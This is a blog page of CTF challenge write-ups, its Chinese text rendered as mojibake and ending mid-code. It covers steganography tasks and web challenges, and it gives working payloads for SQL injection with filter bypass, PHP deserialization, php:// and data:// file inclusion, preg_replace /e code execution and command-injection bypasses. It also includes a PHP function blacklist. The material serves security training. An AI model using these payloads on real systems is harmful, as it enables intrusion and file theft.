<h4 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h4><p>å†…ç½‘æ‰«æ</p>
<p>æ²¡åšå‡ºæ¥</p>
<p>file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arp</p>
<p>10.128.253.12</p>
<p>169.254.1.1</p>
<hr>
<h1 id="Unicorn"><a href="#Unicorn" class="headerlink" title="Unicorn"></a>Unicorn</h1><h4 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h4><p>ä¹°ç‹¬è§’å…½ï¼Œä¹°ä¹°ä¹°å‘ç°å½“idæ˜¯4çš„æ—¶å€™è¿”å›<code>Only one char(?) allowed!</code></p>
<p>åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œè¿˜è¦å¾ˆå¤šçš„é’±</p>
<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">Unicode - Compart</a></p>
<p>åœ¨ä¸Šé¢è¿™ä¸ªç½‘ç«™æœ<code>number</code>ï¼Œæ‰¾åˆ°Numeric Valueå¤§äºä»·æ ¼çš„å­—ç¬¦ï¼Œç„¶åèµ‹å€¼utf-8çš„å€¼ï¼ŒæŠŠ0xæ”¹æˆ%ï¼Œä¸­é—´ä¸ç•™ç©ºæ ¼ï¼Œæ‹¿åˆ°flag.</p>
<hr>
<h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><h4 id="ç¬¬ä¸€ç« -webå…¥é—¨-å¸¸è§çš„æœé›†"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-å¸¸è§çš„æœé›†" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]å¸¸è§çš„æœé›†"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]å¸¸è§çš„æœé›†</h4><p>robots.txt</p>
<p>index.php~</p>
<p>.index.php.swp</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h4 id="äºŒç»´ç "><a href="#äºŒç»´ç " class="headerlink" title="äºŒç»´ç "></a>äºŒç»´ç </h4><p>ä¸‹è½½æ–‡ä»¶æ˜¯ä¸ªäºŒç»´ç ï¼Œä½¿ç”¨å·¥å…·QR_ResearchæŸ¥çœ‹ï¼Œå¹¶æ²¡æœ‰å‘ç°flagï¼Œç„¶åçŒœæµ‹æœ‰éšè—æ–‡ä»¶ï¼Œæ‰“å¼€kaliï¼Œä½¿ç”¨binwalkåˆ†ææ–‡ä»¶ã€‚</p>
<blockquote>
<p>binwalk QR_code.png</p>
</blockquote>
<p>æœç„¶å‘ç°æœ‰ä¸€ä¸ªzipï¼Œä½¿ç”¨foremostæ–‡ä»¶åˆ†ç¦»ã€‚</p>
<blockquote>
<p>foremost QR_code.png -o 111</p>
</blockquote>
<p>ç”Ÿæˆäº†111æ–‡ä»¶å¤¹ï¼Œçœ‹zipï¼Œè§£å‹éœ€è¦å¯†ç ï¼Œæ–‡ä»¶åå­—æ˜¯4number.txtï¼Œæç¤ºå¯†ç å¯èƒ½æ˜¯4ä¸ªæ•°å­—ï¼Œä½¿ç”¨&#x3D;&#x3D;fcrackzip&#x3D;&#x3D;æš´åŠ›ç ´è§£</p>
<blockquote>
<p>fcrackzip -b -c 1 -l 4-4 -u 00000000.zip </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å‚æ•°è§£é‡Šï¼š</span><br><span class="line">-bï¼š			ä½¿ç”¨æš´åŠ›ç ´è§£</span><br><span class="line">-c 1ï¼š			ä½¿ç”¨å­—ç¬¦é›†ï¼Œ1æŒ‡æ•°å­—é›†åˆ</span><br><span class="line">-l 4-4ï¼š		æŒ‡å®šå¯†ç é•¿åº¦ï¼Œæœ€å°é•¿åº¦-æœ€å¤§é•¿åº¦</span><br><span class="line">-uï¼š			ä¸æ˜¾ç¤ºé”™è¯¯å¯†ç ï¼Œä»…æ˜¾ç¤ºæœ€ç»ˆæ­£ç¡®å¯†ç </span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°flag</p>
<hr>
<h4 id="Nç§æ–¹æ³•è§£å†³"><a href="#Nç§æ–¹æ³•è§£å†³" class="headerlink" title="Nç§æ–¹æ³•è§£å†³"></a>Nç§æ–¹æ³•è§£å†³</h4><p><a target="_blank" rel="noopener" href="https://the-x.cn/base64/">Base64è§£ç  Base64ç¼–ç  UTF8 GB2312 UTF16 GBK äºŒè¿›åˆ¶ åå…­è¿›åˆ¶ è§£å¯† - The X åœ¨çº¿å·¥å…· (the-x.cn)</a></p>
<p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªexeæ–‡ä»¶ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€å‘ç°æœ‰base64åŠ å¯†ï¼Œè®¿é—®ä¸Šé¢çš„è¿æ¥è¿›è¡Œbase64è§£ç ï¼Œå¯ä»¥ç›´æ¥å¾—åˆ°ä¸€ä¸ªpngæ–‡ä»¶ï¼Œæ‰«æäºŒç»´ç å¾—åˆ°flag</p>
<hr>
<h4 id="åŸºç¡€ç ´è§£"><a href="#åŸºç¡€ç ´è§£" class="headerlink" title="åŸºç¡€ç ´è§£"></a>åŸºç¡€ç ´è§£</h4><p>è§£å‹zipï¼Œæç¤ºå¯†ç æ˜¯å››ä½æ•°å­—ï¼Œä½¿ç”¨è½¯ä»¶&#x3D;&#x3D;ARCHPR&#x3D;&#x3D; ,è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå¾—åˆ°å¯†ç ï¼Œè§£å‹ï¼Œbase64è§£ç ï¼Œå¾—åˆ°flag.</p>
<hr>
<h4 id="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"><a href="#å¦å¤–ä¸€ä¸ªä¸–ç•Œ" class="headerlink" title="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"></a>å¦å¤–ä¸€ä¸ªä¸–ç•Œ</h4><p><a target="_blank" rel="noopener" href="https://www.rapidtables.org/zh-CN/convert/number/ascii-hex-bin-dec-converter.html">ASCIIæ–‡æœ¬ï¼Œåå…­è¿›åˆ¶ï¼ŒäºŒè¿›åˆ¶ï¼Œåè¿›åˆ¶ï¼ŒBase64è½¬æ¢å™¨ (rapidtables.org)</a></p>
<p>ç”¨010editoræ‰“å¼€ï¼Œæ‹‰å€’æœ«å°¾ï¼Œå¤åˆ¶äºŒè¿›åˆ¶ï¼Œä¸¢åˆ°ä¸Šé¢çš„ç½‘ç«™è§£ç ï¼Œå¾—åˆ°flag</p>
<hr>
<h4 id="å¤§ç™½"><a href="#å¤§ç™½" class="headerlink" title="å¤§ç™½"></a>å¤§ç™½</h4><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€å¼ å¤§ç™½çš„ç…§ç‰‡ï¼Œ&#x3D;&#x3D;PNGå›¾ç‰‡ä¿®å¤&#x3D;&#x3D;</p>
<p>ä½¿ç”¨è„šæœ¬</p>
<p><img src="/images/misc2.png" alt="misc2"></p>
<hr>
<h4 id="é¢å…·ä¸‹çš„flag"><a href="#é¢å…·ä¸‹çš„flag" class="headerlink" title="é¢å…·ä¸‹çš„flag"></a>é¢å…·ä¸‹çš„flag</h4><p>æ˜¯ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œç”¨binwalkåˆ†è§£ï¼Œæœ‰zipåŒ…ï¼Œæ˜¯ä¸ªä¼ªåŠ å¯†ã€‚</p>
<p><img src="/images/msic3.png" alt="msic3"></p>
<p>è§£å‹åå¾—åˆ°ä¸€ä¸ªflag.vmdkæ–‡ä»¶ï¼Œä½¿ç”¨å‘½ä»¤ï¼š</p>
<blockquote>
<p> 7z x flag.vmdk -o.&#x2F;</p>
</blockquote>
<p>è§£å‹åå¾—åˆ°key_part_oneå’Œkey_part_twoï¼Œåˆ†åˆ«å¾—åˆ°åŠ å¯†çš„ä¿¡æ¯ï¼š</p>
<p><img src="/images/misc4.png" alt="misc4"></p>
<p>[Brainfuck&#x2F;Ook! Obfuscation&#x2F;Encoding <a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">splitbrain.org]</a><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a>)</p>
<p>è§£å¯†ç½‘ç«™</p>
<hr>
<h4 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h4><p>æ–‡ä»¶åˆ†ç¦»ï¼Œå¾—åˆ°zipæ–‡ä»¶ï¼Œè§£å‹å¾—åˆ°,keyå’Œcipherã€‚</p>
<p>keyé‡Œé¢æ˜¯base64ï¼Œè§£å¯†åç›´æ¥ç™¾åº¦ã€‚</p>
<p><a target="_blank" rel="noopener" href="http://serpent.online-domain-tools.com/">Serpent Encryption â€“ Easily encrypt or decrypt strings or files (online-domain-tools.com)</a></p>
<p>&#x3D;&#x3D;serpentåŠ å¯†&#x3D;&#x3D;</p>
<p>ä½¿ç”¨è¿™ä¸ªç½‘ç«™è§£ç </p>
<h1 id="â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”"><a href="#â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”" class="headerlink" title="â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”"></a>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</h1><h4 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h4><p>è¦ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œtext,file,passwordã€‚</p>
<p>ç¬¬ä¸€å±‚ï¼Œè¦ä½¿ä»¥textä¸ºè·¯å¾„çš„æ–‡ä»¶å†…å®¹ä¸ºwelcome to the zjctfï¼Œè¿™é‡Œç”¨åˆ°dataåè®®å†™å…¥ï¼Œå³<code>?text=data://text/plain,welcome to the zjctf</code></p>
<p>ç¬¬äºŒå±‚ï¼Œå¯¹fileè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œä¸èƒ½å‡ºç°flagï¼Œé‚£æˆ‘ä»¬è®¿é—®ä¸€ä¸‹æç¤ºçš„useless.phpï¼Œè¿™é‡Œä½¿ç”¨phpä¼ªåè®®ï¼Œå³<code>file=php://filter/convert.base64-encode/resource=useless.php</code></p>
<p>ç¬¬ä¸‰å±‚ï¼Œæ‹¿åˆ°useless.phpçš„æºä»£ç åï¼Œå‘ç°è¦æ„é€ åºåˆ—åŒ–è¯­å¥ï¼Œè¿™é‡Œå¾ˆå®¹æ˜“ï¼Œè‡ªå·±å†™ä¸ªexpå°±è¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Flag</span>);</span><br></pre></td></tr></table></figure>

<p>å°†åºåˆ—åŒ–åçš„å€¼ç»™passwordã€‚</p>
<p>æœ€ç»ˆpayloadä¸ºï¼š<code>?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>ï¼ŒæŸ¥çœ‹æºä»£ç å³å¯æ‹¿flag</p>
<hr>
<h4 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h4><p>ç‚¹joinï¼Œåˆ›å»ºè´¦å·ï¼Œå‘ç°ç”¨æˆ·åå¯ä»¥ç‚¹å‡»ï¼Œç‚¹å‡»åå‘ç°æ³¨å…¥ç‚¹ï¼Œsqlæ³¨å…¥</p>
<p>order by 4 # æœ‰4åˆ—</p>
<p>union select 1,2,3,4# æŠ¥é”™ï¼Œè¿‡æ»¤äº†union selectï¼Œå°±ç”¨union&#x2F;**&#x2F;select 1,2,3,4# å‘ç°2çš„ä½ç½®å›æ˜¾ï¼ŒæŸ¥åº“æŸ¥è¡¨ï¼Œå‘ç°åœ¨fakebookæ•°æ®åº“çš„usersè¡¨ä¸­çš„dataå­—æ®µæ˜¯ä¸€æ®µåºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæƒ³åˆ°å¯ä»¥ç”¨ssrfè§£å†³ï¼Œç”¨dirsearchæ‰«æå¾—åˆ°robots.txtå’Œuser.php.bakï¼Œä¸‹è½½ä¸‹æ¥ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>æ„é€ payloadï¼š</p>
<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,â€™O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:1;s:4:â€blogâ€;s:29:â€file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€;}â€™#</p>
<p>åœ¨ç½‘é¡µæºä»£ç ä¸­å‘ç°flag</p>
<p>å¦ä¸€ç§æ–¹æ³•ï¼š</p>
<p>ä½¿ç”¨load_file()å‡½æ•°ï¼Œç›´æ¥å¾—åˆ°flagï¼Œä¸è¿‡å‰ææ˜¯çŸ¥é“flagæ–‡ä»¶ä½ç½® </p>
<p>payloadï¼š&#x2F;view.php?no&#x3D;0 union&#x2F;**&#x2F;select 1,load_file(â€˜&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€™),3,4</p>
<hr>
<h4 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h4><p>æŸ¥çœ‹robots.txtå‘ç°fAke_f1agggg.phpï¼Œè®¿é—®å‘ç°æ˜¯ä¸ªå‡çš„flagï¼ŒæŠ“ä¸ªåŒ…å‘ç°&#x2F;fl4g.phpã€‚ç„¶åä»£ç å®¡è®¡ã€‚</p>
<p>ç¬¬ä¸€ä¸ªè€ƒå¯Ÿäº†intvalå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°è¿”å›æ•´æ•°ï¼Œ</p>
<p>å¦‚æœintvalå‡½æ•°å‚æ•°å¡«å…¥&#x3D;&#x3D;ç§‘å­¦è®¡æ•°æ³•&#x3D;&#x3D;çš„å­—ç¬¦ä¸²ï¼Œä¼šä»¥eå‰é¢çš„æ•°å­—ä½œä¸ºè¿”å›å€¼è€Œå¯¹äºç§‘å­¦è®¡æ•°æ³•+æ•°å­—åˆ™ä¼šè¿”å›å­—ç¬¦ä¸²ç±»å‹</p>
<p>å¡«å…¥2e4åˆ™å¯ä»¥è¦è¿‡intvalæ„é€ payloadï¼šnum&#x3D;1e10</p>
<p>ç¬¬äºŒä¸ªè€ƒå¯Ÿmd5ï¼Œç™¾åº¦ï¼Œmd5&#x3D;0e215962017</p>
<p>ç¬¬ä¸‰ä¸ªå‘½ä»¤æ³¨å…¥ï¼Œå…ˆlsï¼Œå‘ç°fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaagæ–‡ä»¶ï¼Œå†ç”¨catè¯»ï¼Œä½†æ˜¯catè¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œç”¨å¼•å·ç»•è¿‡å³å¯ï¼Œçš„flag</p>
<hr>
<h4 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11588219.html">CISCN 2019 åˆèµ›]Love Math - MustaphaMond - åšå®¢å›­ (cnblogs.com)</a></p>
<p>éœ€è¦æ„é€ è¿™ä¸ªï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°åå’Œå‚æ•°éƒ½é€šè¿‡GETä¸Šä¼ ï¼Œäºæ˜¯æ¨å‡º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$_GET</span>[<span class="string">&#x27;pi&#x27;</span>])(<span class="variable">$_GET</span>[<span class="string">&#x27;abs&#x27;</span>]);<span class="comment">//è¿™é‡Œç”¨piå’Œabsæ˜¯é‡‡ç”¨ç™½åå•é‡Œé¢çš„</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºä¸­æ‹¬å·ã€å¼•å·è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨å¤§æ‹¬å·ä»£æ›¿</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$_GET</span>&#123;pi&#125;)(<span class="variable">$_GET</span>&#123;abs&#125;);</span><br></pre></td></tr></table></figure>

<p><code>$_GET</code>å‡½æ•°ä¸åœ¨ç™½åå•å†…ï¼Œæƒ³åŠæ³•æ„é€ ï¼Œæœ‰ç‚¹å›°éš¾ï¼Œæ¯•ç«Ÿè¿˜è¦æ±‚å¤§å†™ï¼š<br>è¿™é‡Œç”¨<code>dechex()</code>(åè¿›åˆ¶è½¬åå…­è¿›åˆ¶)æ„é€ å‡º16è¿›åˆ¶æ•°ï¼Œå†ç”¨<code>bin2hex()</code>ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>)&#123;pi&#125;((<span class="variable">$$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=tac /flag</span><br></pre></td></tr></table></figure>

<p>ç„¶é¹…bin2hexå¹¶ä¸åœ¨ç™½åå•é‡Œé¢ï¼Œè¿™ç©æ„è¿˜è¦æ„é€ å‡ºæ¥ï¼Œç”¨base_convert()æ„é€ ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;pi&#125;)(<span class="variable">$$pi</span>&#123;abs&#125;)&amp;pi=system&amp;abs=c<span class="string">&#x27;a&#x27;</span>t /flag</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°flag</p>
<hr>
<h4 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h4><p>&#x3D;&#x3D;æ–‡ä»¶åŒ…å«ï¼Œå‘½ä»¤æ‰§è¡Œ&#x3D;&#x3D;</p>
<p>å¼€å¤´å’Œ<code>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</code>å¾ˆåƒï¼Œç„¶åæ‹¿åˆ°next.phpæºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(        </span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ¶‰åŠ<code>preg_replace \e</code>çš„æ¼æ´ã€‚å‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p>æ„é€ payloadï¼š&#x2F;next.php?\S*&#x3D;{${getFlag()}}&amp;cmd&#x3D;system(â€˜cat &#x2F;flagâ€™);</p>
<hr>
<h4 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h4><p>é¡µé¢ä¸€ç›´åˆ·æ–°æŠ“åŒ…çœ‹çœ‹ï¼Œå‘ç°postä¸Šä¼ äº†ä¸¤ä¸ªå‚æ•°ï¼Œ<code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code></p>
<p>çŒœæµ‹funcæ˜¯å‡½æ•°å,pæ˜¯å‚æ•°ã€‚<code>func=system&amp;p=ls</code>è¿”å›heck!!</p>
<p>åº”è¯¥æ˜¯è¿‡æ»¤äº†systemï¼Œç„¶åä½¿ç”¨file_get_contentsè¯»å–æºç </p>
<p><code>func=file_get_contents&amp;p=index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span>=<span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);<span class="comment">//é»‘åå•</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span 